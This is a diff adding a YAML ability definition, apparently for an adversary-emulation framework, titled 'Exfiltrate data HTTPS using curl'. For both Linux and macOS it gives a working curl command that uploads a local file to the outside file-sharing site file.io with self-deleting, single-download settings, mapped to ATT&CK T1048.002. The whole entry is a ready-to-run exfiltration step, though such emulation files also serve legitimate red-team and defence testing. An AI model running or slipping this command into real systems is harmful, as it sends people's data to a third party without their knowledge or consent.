@@ -1,0 +1,25 @@
+- description: 'Exfiltrate data HTTPS using curl to file share site file.io
+
+    '
+  id: 1ecd8f81d020145064af72dbcd47110a
+  name: Exfiltrate data HTTPS using curl linux
+  platforms:
+    darwin:
+      sh:
+        cleanup: ''
+        command: curl -F 'file=@3945c9_artifact' -F 'maxDownloads=1' -F 'autoDelete=true'
+          https://file.io/
+        payloads:
+        - 3945c9_artifact
+    linux:
+      sh:
+        cleanup: ''
+        command: curl -F 'file=@3945c9_artifact' -F 'maxDownloads=1' -F 'autoDelete=true'
+          https://file.io/
+        payloads:
+        - 3945c9_artifact
+  tactic: exfiltration
+  technique:
+    attack_id: T1048.002
+    name: Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted
+      Non-C2 Protocol
